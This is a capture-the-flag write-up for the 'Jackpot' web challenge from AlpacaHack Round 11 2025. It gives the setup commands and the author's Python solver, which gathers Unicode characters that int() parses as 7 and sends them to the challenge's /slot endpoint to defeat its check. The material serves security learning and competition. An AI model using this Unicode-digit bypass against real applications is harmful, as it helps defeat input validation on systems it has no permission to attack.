---
title: "Jackpot - AlpacaHack Round 11 2025"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "jackpot", "web", "alpacahack-round-11"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202505_AlpacaHack_Round_11/web/jackpot"
license: "none stated"
ctf:
  name: "AlpacaHack Round 11"
  year: 2025
  challenge: "Jackpot"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202505_AlpacaHack_Round_11/web/jackpot>
- **CTF:** AlpacaHack Round 11 2025

---

# [web] Jackpot

## Description

🎰 Slot Machine 🎰

## Attachments

- [jackpot](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```


## Solver: `solve.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202505_AlpacaHack_Round_11/web/jackpot/solution/solve.py>

```python
import os
import httpx

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 3000))

client = httpx.Client(base_url=f"http://{HOST}:{PORT}")

candidates = ""
for i in range(0, 0x10FFFF + 1):
    c = chr(i)
    try:
        if int(c) == 7:
            candidates += c
    except:
        pass

print(f"{candidates = }")
# 7٧۷߇७৭੭૭୭௭౭೭൭෭๗໗༧၇႗៧᠗᥍᧗᪇᪗᭗᮷᱇᱗꘧꣗꤇꧗꧷꩗꯷７𐒧𐴷𑁭𑃷𑄽𑇗𑋷𑑗𑓗𑙗𑛇𑜷𑣧𑥗𑱗𑵗𑶧𑽗𖩧𖫇𖭗𝟕𝟟𝟩𝟳𝟽𞅇𞋷𞓷𞥗🯷

res = client.get("/slot", params={"candidates": candidates[:10]})
print(res.json())
```
